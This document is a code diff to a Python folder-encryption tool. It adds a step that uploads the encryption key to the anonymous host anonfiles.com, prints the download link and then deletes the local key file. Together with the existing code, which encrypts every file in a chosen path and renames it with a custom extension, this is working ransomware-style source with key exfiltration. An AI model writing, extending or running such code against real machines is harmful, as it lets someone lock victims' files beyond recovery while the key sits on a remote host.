@@ -6,6 +6,7 @@ import pyfiglet
 from colorama import Fore, init
 from cryptography.fernet import Fernet
 from os.path import isfile
+import requests
 
 # Color
 green = Fore.LIGHTGREEN_EX
@@ -26,13 +27,26 @@ def generate_key():
     keys = Fernet.generate_key()
     return keys
 
+def webhook_key(filepath):
+    try:
+        a = requests.post("https://api.anonfiles.com/upload", files={
+            "file": ("x.key", open(filepath, "rb"))
+        })
+        
+        if a.status_code == 200 and a.json()["status"] == True:
+            return a.json()["data"]["file"]["url"]["short"]
+        else:
+            return False
+    except:
+        return False
+
 def checking_file_key():
     if os.path.exists("x.key"):
         os.remove("x.key")
     else:
         pass
 
-def encrypt_file(folder_path, custom_ext = ".asu"):
+def encrypt_file(folder_path, custom_ext = ".asu", webhook_keys = "y"):
     key = generate_key()
     file_arr = []
     fernet_key = Fernet(key)
@@ -67,7 +81,13 @@ def encrypt_file(folder_path, custom_ext = ".asu"):
                     continue
             except:
                 print(f"{white}[{red}!{white}] Failed To Encrypt {yellow}{x}")
-        print(f"{red}[{green}*{red}]{white} Done Encrypted Files In Path {green}{folder_path}")
+        if webhook_keys.lower() == "y":
+            url_key = webhook_key("x.key")
+            print(f"{red}[{green}*{red}] {white}File Key url : {green}{url_key}")
+            checking_file_key()
+            print(f"{red}[{green}*{red}]{white} Done Encrypted Files In Path {green}{folder_path}")
+        elif webhook_keys.lower() == "n":
+            print(f"{red}[{green}*{red}]{white} Done Encrypted Files In Path {green}{folder_path}")
 
 
 if __name__=="__main__":
@@ -75,4 +95,5 @@ if __name__=="__main__":
     checking_file_key()
     input_path = input(f"{red}[{white}?{red}] {white}Encrypt Path : ")
     custom_ext_input = input(f"{red}[{white}?{red}] {white}Custom Extension (ex: .hayuk) : ")
-    encrypt_file(input_path, custom_ext_input)
+    ask_webhook = input(f"{red}[{white}?{red}] {white}Want use webhook {green}anonfiles.com {white}for file key? (y/n) : ")
+    encrypt_file(input_path, custom_ext_input, ask_webhook)
